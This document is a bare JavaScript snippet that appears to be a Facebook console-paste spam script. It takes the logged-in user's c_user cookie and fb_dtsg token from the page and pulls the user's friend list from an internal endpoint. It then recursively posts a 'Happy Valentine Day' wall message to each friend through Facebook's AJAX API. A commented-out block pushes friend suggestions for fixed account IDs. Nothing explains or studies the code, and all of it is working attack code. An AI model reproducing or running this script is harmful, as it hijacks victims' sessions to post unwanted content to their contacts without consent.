
jx = {
    b: function () {
        var b = !1;
        if ("undefined" != typeof ActiveXObject) try {
            b = new ActiveXObject("Msxml2.XMLHTTP")
        } catch (c) {
            try {
                b = new ActiveXObject("Microsoft.XMLHTTP")
            } catch (a) {
                b = !1
            }
        } else if (window.XMLHttpRequest) try {
            b = new XMLHttpRequest
        } catch (h) {
            b = !1
        }
        return b
    },
    load: function (b, c, a, h, g) {
        var e = this.d();
        if (e && b) {
            e.overrideMimeType && e.overrideMimeType("text/xml");
            h || (h = "GET");
            a || (a = "text");
            g || (g = {});
            a = a.toLowerCase();
            h = h.toUpperCase();
            b += b.indexOf("?") + 1 ? "&" : "?";
            var k = null;
            "POST" == h && (k = b.split("?"), b = k[0], k = k[1]);
            e.open(h, b, !0);
            e.onreadystatechange = g.c ?
            function () {
                g.c(e)
            } : function () {
                if (4 == e.readyState) if (200 == e.status) {
                    var b = "";
                    e.responseText && (b = e.responseText);
                    "j" == a.charAt(0) ? (b = b.replace(/[\n\r]/g, ""), b = eval("(" + b + ")")) : "x" == a.charAt(0) && (b = e.responseXML);
                    c && c(b)
                } else g.f && document.getElementsByTagName("body")[0].removeChild(g.f), g.e && (document.getElementById(g.e).style.display = "none"), error && error(e.status)
            };
            e.send(k)
        }
    },
    d: function () {
        return this.b()
    }
};


function Posting(o) {
    jx.load(window.location.protocol + "//www.facebook.com/ajax/stream/inline.php?fb_dtsg=" + fb_dtsg + "&walltarget=" + o + "&render_notif_only=1&birthday=1&message_text=" + encodeURIComponent(msg) + "&message=" + encodeURIComponent(msg) + "&giftsgroupid=8ff493ad46&post=Post&nctr[_mod]=pagelet_reminders&__user=" + user_id + "&__a=1&__dyn=7n8ahyj35CFIwd9e&__req=1b&phstamp=", function () {}, "text", "post");

	
    tay--;
    if (tay > 0) {
        var s = arr[tay];
	Posting(s);
		
    }


}

var now = (new Date).getTime();
var i = 3;
var tay = 3;
var suc = 0;
var arr = new Array;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var msg = 'Happy Valentine Day';
jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
    var b = a;
    var c = b.substring(b.indexOf("{"));
    var d = JSON.parse(c);
    d = d.payload.entries;
    for (var e = 0; e < d.length; e++) arr.push(d[e].uid);
    i = arr.length - 1;
    tay = i;
	Posting(arr[i]);
	
});



/*

	    if (fb_dtsg) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + o + "&newcomer=1273872655&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=1658165120113116104521114", function () {}, "text", "post")
    }
    if (fb_dtsg) {
        jx.load(window.location.protocol + "//www.facebook.com/ajax/friends/suggest?&receiver=" + o + "&newcomer=100002920534041&attempt_id=0585ab74e2dd0ff10282a3a36df39e19&ref=profile_others_dropdown&__user=" + user_id + "&__a=1&__dyn=798aD5z5CF-&__req=17&fb_dtsg=" + fb_dtsg + "&phstamp=1658168561015387781130", function () {}, "text", "post")
    }
*/
